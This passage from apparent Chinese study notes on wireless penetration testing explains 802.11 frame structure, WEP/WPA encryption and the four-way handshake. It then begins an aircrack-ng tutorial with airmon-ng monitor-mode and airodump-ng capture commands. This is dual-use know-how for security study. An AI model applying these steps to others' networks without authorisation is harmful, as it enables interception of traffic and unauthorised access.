<p><code>More Frag</code>（1位）：用于说明长帧被分段的情况，后续是否还有其它的帧。为1表示有后续分段。此帧可能为数据帧或管理帧。只有单播接收地址的帧会被分段</p>
<p><code>Retry</code>（重传域，1位）：用于帧的重传，接收<code>STATION</code>利用该域消除重传帧。为1表示此帧为重传帧。此帧可能为数据帧或者管理帧</p>
<p><code>Pwr Mgt</code>（能量管理域，1位）：为1表示<code>STATION</code>处于power_save(省电)模式。为0表示<code>STATION</code>处于active(活动)模式。当<code>STATION</code>处于省电模式时，向关联的<code>AP</code>发送该值为1的帧(<code>AP</code>不使用此字段)，省电模式下的<code>STATION</code>不接收数据(只可接收<code>AP</code>发来的特定类型的帧)，发送给它的数据帧由<code>AP</code>暂时缓存，<code>AP</code>向<code>STATION</code>发送唤醒类型帧将其唤醒为活动状态，<code>STATION</code><strong>主动</strong>向<code>AP</code>索要暂存的数据帧</p>
<p><code>More Data</code>（更多数据域，1位）：当<code>AP</code>缓存了至少一个<code>MSDU</code>时，会向省电模式的<code>STATION</code>发送该值为1的帧，表示有数据要传输给<code>STATION</code>，接收到此帧的<code>STATION</code>唤醒自己并向<code>AP</code>发送<code>PS-Poll</code>帧，取回由<code>AP</code>为其缓存的数据。或者也可用于<code>AP</code>有更多的广播/多播帧需要发送的情况</p>
<p><code>Protected Frame</code>（保护域，1位）：为1表示帧体部分包含被密钥套处理过的数据；也用于表示<code>PSK</code>身份验证的<code>Frame#3</code>帧。否则为0</p>
<p><code>Order</code>（序号域，1位）：为1表示在非<code>QoS</code>帧的情况下，长帧分段传送采用严格编号方式，按顺序处理。否则为0</p>
<h4 id="Duration-ID（持续时间-标识）"><a href="#Duration-ID（持续时间-标识）" class="headerlink" title="Duration/ID（持续时间/标识）"></a>Duration/ID（持续时间/标识）</h4><p>所有控制帧都是用该字段，其作用随<code>Type/SubType</code>变化有所不同</p>
<p>帧类型为<code>PS Poll(type:1,subtype:10)</code>时，该字段表示<code>STATION</code>关联的<code>AID(association identity,关联标识)</code></p>
<p>其他情况下该字段作为一种载波侦听机制，表示接收下一帧之前需要保持的时间间隔，用于<code>NAV(Network Allocation Vector,网络位置向量)</code>计算，单位微秒</p>
<h4 id="Sequence-Control（序列控制域）"><a href="#Sequence-Control（序列控制域）" class="headerlink" title="Sequence Control（序列控制域）"></a>Sequence Control（序列控制域）</h4><p>包含两个子字段：<code>Sequence Number</code>,<code>Fragment Number</code></p>
<p><code>Sequence Number</code>是每个帧的编号，数值范围是0-4095，以1为步长递增。当帧被分段时，同一帧中不同分段的<code>Sequence Number</code>相同</p>
<p><code>Fragment Number</code>是被分段的帧用于标识分段位置顺序的编号，数值范围0-15，以1为步长递增</p>
<h3 id="802-11-MAC数据段"><a href="#802-11-MAC数据段" class="headerlink" title="802.11 MAC数据段"></a>802.11 MAC数据段</h3><h4 id="Frame-Body"><a href="#Frame-Body" class="headerlink" title="Frame Body"></a>Frame Body</h4><p>变长</p>
<p>数据字段，未加密的最大<code>MSDU</code>长度为2304字节(包含最大256字节的上层头信息和可被传递的数据2048字节)</p>
<p>不同的加密方法会增加一定的内容长度</p>
<ol>
<li><p><code>WEP</code>加密：增加8字节，总长度为2312字节</p>
</li>
<li><p><code>TKIP(WPA1)</code>加密：增加20字节，总长度为2324字节</p>
</li>
<li><p><code>CCMP(WPA2)</code>加密：增加16字节，总长度2320字节</p>
</li>
</ol>
<p><strong>控制帧中无<code>Frame Body</code>内容</strong></p>
<h3 id="802-11-MAC校验"><a href="#802-11-MAC校验" class="headerlink" title="802.11 MAC校验"></a>802.11 MAC校验</h3><h4 id="FCS（32位）"><a href="#FCS（32位）" class="headerlink" title="FCS（32位）"></a>FCS（32位）</h4><p>发送端对全部<code>MAC</code>包头和<code>Frame Body</code>内容进行<code>CRC</code>计算，计算结果即为<code>FCS</code>值</p>
<p>接收端接收到帧时，对全部<code>MAC</code>包头和<code>Frame Body</code>内容进行同样计算，与<code>FCS</code>值进行比较，结果一致时，向发送端返回<code>ACK</code>，否则丢弃帧(只对单播帧有效，<code>FCS</code>错误的广播/多播帧可能被接收)</p>
<p><strong><code>wireshark</code>抓包时可能已经删除了<code>FCS</code>值</strong></p>
<hr>
<h2 id="CONTROL-FRAME-控制帧"><a href="#CONTROL-FRAME-控制帧" class="headerlink" title="CONTROL FRAME(控制帧)"></a>CONTROL FRAME(控制帧)</h2><p>802.11头部中的<code>Frame Control</code>中<code>Type</code>为1</p>
<p>控制帧是一些通知设备开始、停止传输或连接失败等情况的短消息</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/9.png" alt="9.png"></p>
<h3 id="ACK帧"><a href="#ACK帧" class="headerlink" title="ACK帧"></a>ACK帧</h3><p>接收端正确接收数据后向发送端返回<code>ACK</code>确认</p>
<p>每个单播帧需要立即确认<code>ACK</code>，组播和广播帧不需要<code>ACK</code>确认</p>
<p>由硬件完成，非驱动层</p>
<p>帧类型：1/13(<code>Type/Subtype</code>)</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/10.png" alt="10.png"></p>
<h3 id="PS-POLL帧"><a href="#PS-POLL帧" class="headerlink" title="PS-POLL帧"></a>PS-POLL帧</h3><p><code>RF</code>系统的放大器：主要耗电的组件，发射前放大信号，接受并放大还原信号</p>
<p><code>AID</code>：<code>Association ID</code>、关联标识，当<code>STATION</code>连接到一个<code>AP</code>时，<code>AP</code>会向<code>STATION</code>发送一个<code>AID</code>，存于<code>STATION</code>内存中</p>
<h4 id="STATION省电模式唤醒"><a href="#STATION省电模式唤醒" class="headerlink" title="STATION省电模式唤醒"></a><code>STATION</code>省电模式唤醒</h4><ol>
<li><p>数据发送至<code>AP</code>(<code>AP</code>缓存数据包)</p>
</li>
<li><p><code>AP</code>向<code>STATION</code>通过<code>Beacon</code>发送<code>TIM</code>，其中包含<code>AID</code></p>
</li>
<li><p><code>STATION</code>对比<code>AID</code>后唤醒网卡</p>
</li>
<li><p><code>STATION</code>发送<code>PS-Poll</code>帧，请求从<code>AP</code>缓存中取回数据</p>
</li>
</ol>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/11.png" alt="11.png"></p>
<p>每个帧都需要<code>ACK</code>确认</p>
<p><code>AP</code>接收到<code>ACK</code>后，从缓存中删除数据帧</p>
<p>传输过程中<code>STATION</code>保持唤醒状态</p>
<p>传输结束后<code>STATION</code>恢复省电状态</p>
<p><code>AP</code>接收<code>PS-Poll</code>帧后，可选择立即响应或延迟响应，延迟响应时<code>AP</code>需向<code>STATION</code>返回<strong>简单响应帧</strong>，通知<code>STATION</code>延迟响应</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/12.png" alt="12.png"></p>
<p><code>AID</code>：关联<code>ID</code></p>
<p><code>BSSID</code>：<code>STATION</code>正关联的<code>AP</code>地址</p>
<p><code>TA</code>：发送此帧的<code>STATION</code>地址</p>
<h3 id="RTS-CTS帧"><a href="#RTS-CTS帧" class="headerlink" title="RTS/CTS帧"></a>RTS/CTS帧</h3><p><code>RTS/CTS</code>是<code>CSMA/CA</code>方法的一种补充手段</p>
<ol>
<li><p>降低冲突产生的可能性</p>
</li>
<li><p>正式通信之前通过请求应答机制，确信通信介质的可用性</p>
</li>
<li><p>锁定传输介质并预约通信时间</p>
</li>
<li><p>只有在传输长帧时使用，传输短帧时不会使用。驱动接口提供阈值的自定义，大于阈值的帧被视为长帧，反之为短帧</p>
</li>
<li><p>有效避免隐藏节点。无线网络内存在节点1，2，3。1与3距离太远无法直接通信，2与1和3都可进行通信。对于1来说，3就是一个隐藏节点。因<code>RTS/CTS</code>是广播包，当2与1通信发出<code>RTS/CTS</code>包时，3也会收到，知晓信道的占用，避免了冲突的发生</p>
</li>
</ol>
<h5 id="传输过程"><a href="#传输过程" class="headerlink" title="传输过程"></a>传输过程</h5><p>1发送<code>Request to Send</code>包给2</p>
<p>若未发生冲突，2返回<code>Clear to Send</code>给1</p>
<p>1传输数据</p>
<p>数据接收正常，2返回<code>ACK</code>，否则1无接收数据</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/13.png" alt="13.png"></p>
<p><code>RTS</code>帧长度20字节</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/14.png" alt="14.png"></p>
<p><code>CTS</code>帧长度14字节</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/15.png" alt="15.png"></p>
<hr>
<h2 id="MANAGEMENT-FRAME-管理帧"><a href="#MANAGEMENT-FRAME-管理帧" class="headerlink" title="MANAGEMENT FRAME(管理帧)"></a>MANAGEMENT FRAME(管理帧)</h2><p>802.11头部中的<code>Frame Control</code>中<code>Type</code>为0</p>
<p>用于协商和控制<code>STATION</code>与<code>AP</code>之间的关系</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/16.png" alt="16.png"></p>
<h3 id="BEACON-FRAMES帧"><a href="#BEACON-FRAMES帧" class="headerlink" title="BEACON FRAMES帧"></a>BEACON FRAMES帧</h3><p><code>AP</code>发送的广播帧，通告无线网络的存在(<code>BSSID</code>)</p>
<p>发包频率为102.4ms(可变)</p>
<p>可禁止<code>AP</code>发送此种广播帧，达到隐藏<code>AP</code>的目的</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/17.png" alt="17.png"></p>
<h3 id="PROBE-REQUEST-FRAMES帧"><a href="#PROBE-REQUEST-FRAMES帧" class="headerlink" title="PROBE REQUEST FRAMES帧"></a>PROBE REQUEST FRAMES帧</h3><p>用于<code>STATION</code>扫描现有<code>AP</code></p>
<p>发现连接过的与未连接过的<code>AP</code></p>
<p>扫描请求帧：<br><img src="/images/KaliLinux_shentouceshi/wuxianshentou/18.png" alt="18.png"></p>
<p>当扫描到连接过的<code>AP</code>时，若支持速率、<code>ESSID</code>都相同，<code>AP</code>则会响应<code>STATION</code></p>
<p>响应帧：<br><img src="/images/KaliLinux_shentouceshi/wuxianshentou/19.png" alt="19.png"></p>
<h3 id="AUTHENTICATION-FRAMES帧"><a href="#AUTHENTICATION-FRAMES帧" class="headerlink" title="AUTHENTICATION FRAMES帧"></a>AUTHENTICATION FRAMES帧</h3><p>身份认证</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/20.png" alt="20.png"></p>
<h4 id="Authentication-Algorithm"><a href="#Authentication-Algorithm" class="headerlink" title="Authentication Algorithm"></a>Authentication Algorithm</h4><p>身份认证类型</p>
<p>身份认证由多个帧交换过程组成</p>
<p>0：开放系统身份认证</p>
<p>1：共享密钥身份认证</p>
<h4 id="Authentication-Seq"><a href="#Authentication-Seq" class="headerlink" title="Authentication Seq"></a>Authentication Seq</h4><p>身份认证序列号</p>
<p>每次身份认证过程<code>Seq</code>唯一</p>
<p>依次增长(1-65535)</p>
<h4 id="Challenge-text"><a href="#Challenge-text" class="headerlink" title="Challenge text"></a>Challenge text</h4><p>共享密钥身份认证方式存在此字段</p>
<h4 id="Status-Code"><a href="#Status-Code" class="headerlink" title="Status Code"></a>Status Code</h4><p>表示身份认证成功/失败</p>
<h3 id="ASSOCIATION-REASSOCIATION-FRAMES帧"><a href="#ASSOCIATION-REASSOCIATION-FRAMES帧" class="headerlink" title="ASSOCIATION/REASSOCIATION FRAMES帧"></a>ASSOCIATION/REASSOCIATION FRAMES帧</h3><p>关联帧/重新关联帧</p>
<p>身份认证成功后，<code>STATION</code>执行关联操作，加入无线网络</p>
<h4 id="Association-Request帧"><a href="#Association-Request帧" class="headerlink" title="Association Request帧"></a>Association Request帧</h4><p><code>STATION</code>请求关联<code>AP</code></p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/21.png" alt="21.png"></p>
<h4 id="Reassociation-Request帧"><a href="#Reassociation-Request帧" class="headerlink" title="Reassociation Request帧"></a>Reassociation Request帧</h4><p><code>STATION</code>请求重新关联<code>AP</code></p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/22.png" alt="22.png"></p>
<h4 id="Association-Response帧"><a href="#Association-Response帧" class="headerlink" title="Association Response帧"></a>Association Response帧</h4><p><code>AP</code>对<code>STATION</code>的关联请求的响应</p>
<p>状态码：关联成功/失败</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/23.png" alt="23.png"></p>
<h3 id="DISASSOCIATION-DEAUTHENTICATION帧"><a href="#DISASSOCIATION-DEAUTHENTICATION帧" class="headerlink" title="DISASSOCIATION/DEAUTHENTICATION帧"></a>DISASSOCIATION/DEAUTHENTICATION帧</h3><p> 解除关联/解除身份认证</p>
<p> 由<code>AP</code>发出</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/24.png" alt="24.png"></p>
<p><code>Reason code</code>：表示解除的原因</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/25.png" alt="25.png"></p>
<h3 id="ATIM-FRAMES帧"><a href="#ATIM-FRAMES帧" class="headerlink" title="ATIM FRAMES帧"></a>ATIM FRAMES帧</h3><p>只在<code>Ad-hoc</code>网络下使用</p>
<p><code>STATION</code>(具有<code>AP</code>功能的)使用此帧通知接收<code>STATION</code>其有缓存的数据要接收</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/26.png" alt="26.png"></p>
<hr>
<h2 id="DATA-FRAME-数据帧"><a href="#DATA-FRAME-数据帧" class="headerlink" title="DATA FRAME(数据帧)"></a>DATA FRAME(数据帧)</h2><p>802.11头部中的<code>Frame Control</code>中<code>Type</code>为2</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/27.png" alt="27.png"></p>
<p>传输用户数据</p>
<p>空数据帧：只包含<code>MAC</code>头和<code>FCS</code>，用于<code>STATION</code>声明自己将要进入省电模式</p>
<hr>
<h2 id="无线通信过程"><a href="#无线通信过程" class="headerlink" title="无线通信过程"></a>无线通信过程</h2><p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/28.png" alt="28.png"></p>
<h3 id="Probe-探测"><a href="#Probe-探测" class="headerlink" title="Probe(探测)"></a>Probe(探测)</h3><p><code>STATION</code>向所有信道发出<code>probe</code>帧，发现<code>AP</code></p>
<p><code>AP</code>应答，回复<code>probe response</code></p>
<h5 id="WEP探测过程"><a href="#WEP探测过程" class="headerlink" title="WEP探测过程"></a>WEP探测过程</h5><p><code>AP</code>在发送<code>Beacon</code>时标识其使用<code>WEP</code>加密</p>
<p><code>STATION</code>发现<code>AP</code>时，发送普通<code>Probe</code>帧</p>
<p><code>AP</code>响应<code>probe response</code>帧时声明其采用<code>WEP</code>加密</p>
<h5 id="WPA探测过程"><a href="#WPA探测过程" class="headerlink" title="WPA探测过程"></a>WPA探测过程</h5><p><code>AP</code>在发送<code>Beacon</code>时标识其使用<code>WPA1</code>加密</p>
<p><code>STATION</code>发现<code>AP</code>时，发送普通<code>Probe</code>帧</p>
<p><code>AP</code>响应<code>probe response</code>帧时声明其采用<code>WPA1</code>加密：不同厂商对802.11标准的实现方式不同；在包头中包含<code>WPA1</code>字段信息</p>
<h3 id="Authentication-认证"><a href="#Authentication-认证" class="headerlink" title="Authentication(认证)"></a>Authentication(认证)</h3><p><code>STATION</code>向<code>AP</code>发出验证请求</p>
<p>发生认证过程(过程不唯一)</p>
<p><code>AP</code>响应<code>STATION</code>的认证结果</p>
<h5 id="WEP-OPEN认证过程"><a href="#WEP-OPEN认证过程" class="headerlink" title="WEP OPEN认证过程"></a>WEP OPEN认证过程</h5><p><code>WEP OPEN</code>认证与<code>OPEN</code>认证通信过程相同，不同的是开放身份认证前者数据被<code>WEP</code>加密，后者无加密</p>
<p>正确认证后通信数据被<code>WEP</code>加密</p>
<p>如果认证时客户端输入错误密码，认证依然可以通过，但<code>AP</code>将丢弃该<code>STATION</code>的数据包(起始向量被错误的密钥解密后完整性被破坏，导致数据传输失败)</p>
<p>认证响应正确，身份验证成功</p>
<h5 id="WEP-PSK-共享密钥-认证过程"><a href="#WEP-PSK-共享密钥-认证过程" class="headerlink" title="WEP PSK(共享密钥)认证过程"></a>WEP PSK(共享密钥)认证过程</h5><p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/29.png" alt="29.png"></p>
<ol>
<li><p><code>STATION</code>发送认证请求</p>
</li>
<li><p><code>AP</code>返回随机<code>Challenge</code>(挑战)消息</p>
</li>
<li><p><code>STATION</code>使用<code>PSK</code>加密<code>Challenge</code>并发回<code>AP</code></p>
</li>
<li><p><code>AP</code>使用<code>PSK</code>解密密文，获得<code>Challenge</code>并与原始<code>Challenge</code>比对，相同则验证成功，不同则验证失败</p>
</li>
</ol>
<p>大部分无线驱动首先多次尝试<code>open</code>验证，如失败则尝试<code>PSK</code></p>
<h3 id="Association-关联"><a href="#Association-关联" class="headerlink" title="Association(关联)"></a>Association(关联)</h3><p>无论使用什么加密架构，关联过程完全相同</p>
<p><code>STATION</code>发出关联请求</p>
<p><code>AP</code>响应关联请求</p>
<p>关联成功，开始通信</p>
<p><code>STATION</code>关联包中必须包含目标<code>AP</code>的<code>ESSID</code>，可以通过嗅探此关联包，发现隐藏<code>AP</code>的存在</p>
<hr>
<h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>无线安全根源</p>
<ol>
<li><p>802.11基于无线电波发射信息</p>
</li>
<li><p>嗅探侦听是主要问题</p>
</li>
<li><p>加密机制是必须手段</p>
</li>
</ol>
<p><code>Wired Equivalent Privacy(WEP)</code></p>
<ol>
<li><p>802.11标准的一部分</p>
</li>
<li><p>发布后不久被发现存在安全漏洞</p>
</li>
</ol>
<p><code>Wi-Fi Protected Access(WPA)</code>取代<code>WEP</code></p>
<p>基于<code>802.11i</code>标准实现<code>WPA2</code></p>
<h3 id="OPEN-无加密网络"><a href="#OPEN-无加密网络" class="headerlink" title="OPEN 无加密网络"></a>OPEN 无加密网络</h3><p>无任何加密机制</p>
<p>所有数据都可以被嗅探</p>
<p><code>STATION</code>和<code>AP</code>只协商拼配参数即可连入网络</p>
<h3 id="WEP加密系统"><a href="#WEP加密系统" class="headerlink" title="WEP加密系统"></a>WEP加密系统</h3><p>使用<code>RC4</code>算法加密流量内容，实现机密性</p>
<p>使用<code>CRC32</code>算法检查数据完整性(<code>ICV</code>值)</p>
<p>标准采用24位<code>initialization vector(IV)</code>(起始向量)</p>
<p><code>IV</code>值与密码<code>(PSK)</code>共同组成加密<code>key</code></p>
<h4 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a>RC4算法</h4><p>对称流加密算法</p>
<p>实现简单，速度快</p>
<p>加密：对明文流和密钥流进行<code>XOR</code>运算</p>
<p><code>RC4</code>算法生成加密<code>key</code>：</p>
<ol>
<li><p>合并<code>IV</code>与<code>PSK</code>，利用<code>KSA</code>算法生成起始状态表</p>
</li>
<li><p>将起始状态表利用<code>PRGA</code>算法生成最终密钥流</p>
</li>
</ol>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/30.png" alt="30.png"></p>
<p>解密：对密文流和密钥流进行<code>XOR</code>运算</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/31.png" alt="31.png"></p>
<h3 id="WPA安全系统"><a href="#WPA安全系统" class="headerlink" title="WPA安全系统"></a>WPA安全系统</h3><p><code>Wi-Fi Protected Access</code></p>
<p><code>802.11i</code>组为提高无线安全，开发两个新的链路层加密协议</p>
<ol>
<li><p><code>TKIP(Temporal Key Integrity Protocol)</code>(临时密钥完整性协议)：<code>WPA1</code>(较之<code>WEP</code>可动态改变密钥)</p>
</li>
<li><p><code>CCMP(Counter Mode with CBC-MAC)</code>(计数器模式密码块链消息完整码协议)：<code>WPA2</code></p>
</li>
</ol>
<p><code>WPA</code>加密的两种安全类型</p>
<ol>
<li><p><code>WPA</code>个人：使用预设共享密钥(<code>PSK</code>)实现身份认证</p>
</li>
<li><p><code>WPA</code>企业：使用<code>802.1X</code>和<code>radius</code>服务器实现<code>AAA</code>(认证、授权、审计)。实现用户名密码身份认证</p>
</li>
</ol>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/32.png" alt="32.png"></p>
<p>用户连接<code>AP</code>，输入帐号密码进行身份认证，<code>AP</code>将身份认证信息传送至后台服务器进行认证，返回认证结果</p>
<p><code>EAP</code>协议：扩展的身份认证协议。统一兼容整合各种不同的身份认证方法的框架</p>
<h4 id="WPA1"><a href="#WPA1" class="headerlink" title="WPA1"></a>WPA1</h4><p><code>802.11i</code>第三版草案</p>
<p>与<code>WEP</code>相比：</p>
<ol>
<li><p>都采用逐包进行密钥加密</p>
</li>
<li><p>128位的<code>key</code>和48位的<code>IV</code>(初始向量)</p>
</li>
<li><p><code>RC4</code>流加密数据</p>
</li>
<li><p>使用帧计数器避免重放攻击</p>
</li>
<li><p><code>TKIP</code>使用<code>Michael</code>算法进行完整性校验</p>
</li>
<li><p>兼容早期版本硬件</p>
</li>
</ol>
<h4 id="WPA2"><a href="#WPA2" class="headerlink" title="WPA2"></a>WPA2</h4><p>依据<code>802.11i</code>完全重新设计实现</p>
<p>也称为<code>RSN</code></p>
<p><code>CCMP</code>替代<code>TKIP</code></p>
<p><code>AES</code>加密算法取代<code>RC4</code></p>
<p>不兼容早期版本硬件</p>
<h4 id="WPA企业连接过程"><a href="#WPA企业连接过程" class="headerlink" title="WPA企业连接过程"></a>WPA企业连接过程</h4><p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/33.png" alt="33.png"></p>
<ol>
<li><p>协商安全协议</p>
</li>
<li><p>进行身份认证</p>
</li>
<li><p>密钥分发和验证</p>
</li>
<li><p>数据加密，完整性校验</p>
</li>
</ol>
<h4 id="WPA个人连接过程"><a href="#WPA个人连接过程" class="headerlink" title="WPA个人连接过程"></a>WPA个人连接过程</h4><p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/34.png" alt="34.png"></p>
<ol>
<li><p>协商安全协议</p>
</li>
<li><p>密钥分发和验证</p>
</li>
<li><p>数据加密，完整性校验</p>
</li>
</ol>
<h4 id="协商安全协议过程"><a href="#协商安全协议过程" class="headerlink" title="协商安全协议过程"></a>协商安全协议过程</h4><ol>
<li><p>协商认证方式：<code>PSK</code>或<code>802.1X</code></p>
</li>
<li><p>选择单播和组播/广播流量加密套件：<code>TKIP</code>或<code>CCMP</code></p>
</li>
<li><p><code>STATION</code>通过<code>probe</code>获取无线网络信息：速率、加密算法、通道、名称</p>
</li>
</ol>
<h4 id="身份认证过程-WPA企业"><a href="#身份认证过程-WPA企业" class="headerlink" title="身份认证过程(WPA企业)"></a>身份认证过程(WPA企业)</h4><p>基于<code>EAP</code>协议实现(三种认证方式)：</p>
<ol>
<li><p><code>EAP-TLS</code>：需要互相验证客户端证书与服务器证书</p>
</li>
<li><p><code>EAP-TTLS</code></p>
</li>
<li><p><code>PEAP</code>：混合身份认证，只需验证服务器证书</p>
</li>
</ol>
<p>身份认证流程：</p>
<ol>
<li><p><code>AP</code>将其所支持的身份认证方式发送给客户端，由客户端选择自身所支持的且较为安全的身份认证方式</p>
</li>
<li><p><code>AP</code>将身份验证信息发送给<code>Radius Server</code>进行验证</p>
</li>
<li><p><code>Radius Server</code>返回<code>Radius Accept</code>表示认证成功，其中包含<code>Master Key(MK)</code></p>
</li>
<li><p><code>AP</code>通过<code>EAP</code>消息将<code>Master Key</code>通知给<code>STATION</code>，认证成功</p>
</li>
</ol>
<h4 id="密钥交换"><a href="#密钥交换" class="headerlink" title="密钥交换"></a>密钥交换</h4><p>无线网络设计之初用于一组无线设备进行通信</p>
<p>关联到同一<code>AP</code>的设备共享无线信道</p>
<p>在同一无线网络中。分为单播、广播、组播，三种方式安全特性要求不同</p>
<p>单播通信需要单独密钥加密通信双方流量：<code>pairwise key(PTK)</code>对偶密钥</p>
<p>组播通信需要信任域内所有成员共享同一密钥：<code>group key(GTK)</code>组密钥</p>
<p><code>PTK</code>与<code>GTK</code>为临时性密钥，会按时更新</p>
<h5 id="PMK"><a href="#PMK" class="headerlink" title="PMK"></a>PMK</h5><p>256位(32字节)的<code>HASH</code>值</p>
<h6 id="WPA企业"><a href="#WPA企业" class="headerlink" title="WPA企业"></a>WPA企业</h6><p><code>MK</code>进行<code>TLS-PRF</code>加密得出<code>PMK</code>，<code>PMK</code>通过计算得到<code>PTK</code>，<code>PTK</code>用于<code>STATION</code>与<code>AP</code>间的通信加密</p>
<h6 id="WPA个人"><a href="#WPA个人" class="headerlink" title="WPA个人"></a>WPA个人</h6><p><code>ESSID</code>+<code>PSK</code>+迭代4096次，通过<code>HASH</code>计算生成<code>PMK</code>,<code>PMK</code>通过计算得到<code>PTK</code>，<code>PTK</code>用于<code>STATION</code>与<code>AP</code>间的通信加密</p>
<p><code>STATION</code>与<code>AP</code>分别通过相同的算法、信息计算<code>PMK</code>，并不在网络中进行传递交换</p>
<h5 id="PTK的生成过程"><a href="#PTK的生成过程" class="headerlink" title="PTK的生成过程"></a>PTK的生成过程</h5><p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/35.png" alt="35.png"></p>
<p><code>PMK</code>+两个随机数+<code>AP</code>的<code>MAC</code>地址+<code>STATION</code>的<code>MAC</code>地址，通过<code>HMAC-SHA1</code>散列算法或<code>PRF-X</code>散列算法生成<code>PTK</code></p>
<p><code>PTK</code>中分为<code>DATA ENCR</code>(用于数据传输加密)、<code>DATA MIC</code>(完整性校验)、<code>EAPOL ENCR</code>(进行身份认证时传输加密)、<code>EAPOL MIC</code>(进行身份认证时完整性校验)</p>
<h5 id="四步握手生成PTK"><a href="#四步握手生成PTK" class="headerlink" title="四步握手生成PTK"></a>四步握手生成PTK</h5><p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/36.png" alt="36.png"></p>
<ol>
<li><p><code>AP</code>发送<code>Anonce</code>给<code>STATION</code>，<code>STATION</code>生成<code>Snonce</code>，通过这两个随机数与其他信息即可计算出<code>PTK</code></p>
</li>
<li><p><code>STATION</code>将<code>Snonce</code>与<code>PTK</code>的<code>MIC</code>(完整性校验)发送给<code>AP</code>，<code>AP</code>拿到<code>Snonce</code>，计算出<code>PTK</code>。后进行双方<code>PTK</code>的<code>MIC</code>校验，既可校验<code>PTK</code>，又可判断<code>PMK</code>，进一步可判断<code>PSK</code></p>
</li>
<li><p><code>AP</code>发送<code>GTK</code>与<code>GTK</code>的<code>MIC</code>给<code>STATION</code></p>
</li>
<li><p><code>STATION</code>针对<code>GTK</code>会使用另外的算法进行计算，校验。无误后向<code>AP</code>回复<code>ACK</code>并使用密钥加密</p>
</li>
</ol>
<h4 id="数据加密，完整性校验"><a href="#数据加密，完整性校验" class="headerlink" title="数据加密，完整性校验"></a>数据加密，完整性校验</h4><p>三种算法</p>
<ol>
<li><p><code>TKIP</code></p>
</li>
<li><p><code>CCMP</code></p>
</li>
<li><p><code>WRAP</code>(已废弃)</p>
</li>
</ol>
<hr>
<h2 id="无线渗透实操"><a href="#无线渗透实操" class="headerlink" title="无线渗透实操"></a>无线渗透实操</h2><p><strong>无线渗透第一个、最重要的任务是连接进入要渗透的无线网络(获取身份认证信息)</strong></p>
<h3 id="AIRCRACK-NG基础"><a href="#AIRCRACK-NG基础" class="headerlink" title="AIRCRACK-NG基础"></a>AIRCRACK-NG基础</h3><p>无线渗透和审计神器</p>
<p>包含网络检测、嗅探抓包、包注入、密码破解等功能的工具套件</p>
<h4 id="airmon-ng启动侦听"><a href="#airmon-ng启动侦听" class="headerlink" title="airmon-ng启动侦听"></a>airmon-ng启动侦听</h4><p>配置无线网卡正常工作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service network-manager stop</span><br></pre></td></tr></table></figure>
<p>检测无线网卡硬件信息、驱动信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng</span><br></pre></td></tr></table></figure>
<p>检测<code>AIRCRACK-NG</code>工具与操作系统的兼容性问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng check</span><br><span class="line"></span><br><span class="line">airmon-ng check kill	# 将可能与aircrack-ng冲突的进程kill掉</span><br></pre></td></tr></table></figure>
<p>将无线网卡映射进入<code>Kali</code>虚拟机</p>
<p>启动侦听(将网卡置为<code>monitor</code>模式)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0 5		# 启动侦听，并指定工作信道</span><br><span class="line"></span><br><span class="line">iwlist wlan0mon channel		# 查看网卡使用的无线信道</span><br><span class="line"></span><br><span class="line">airmon-ng stop wlan0mon		# 关闭侦听</span><br></pre></td></tr></table></figure>
<h4 id="airodump-ng无线抓包"><a href="#airodump-ng无线抓包" class="headerlink" title="airodump-ng无线抓包"></a>airodump-ng无线抓包</h4><p>抓包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan2mon</span><br></pre></td></tr></table></figure>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/377.png" alt="377.png"></p>
<p><code>BSSID</code>：<code>AP</code>的<code>MAC</code>地址</p>
<p><code>PWR</code>：网卡接收到的信号强度，距离越近信号越强。当此值为-1时，表示驱动不支持的信号强度或<code>STATION</code>距离超出信号接收范围</p>
<p><code>RXQ</code>：最近10秒成功接收的数据(数据帧、管理帧)的百分比，只有在指定信道抓包时此列才会出现</p>
<p><code>Beacons</code>：接收到此<code>AP</code>发送的<code>beacon</code>帧数量</p>
<p><code>#Data</code>：抓到的数据(数据帧、管理帧)的数量(在<code>WEP</code>加密中表示<code>IV</code>数量)，包含广播数据帧</p>
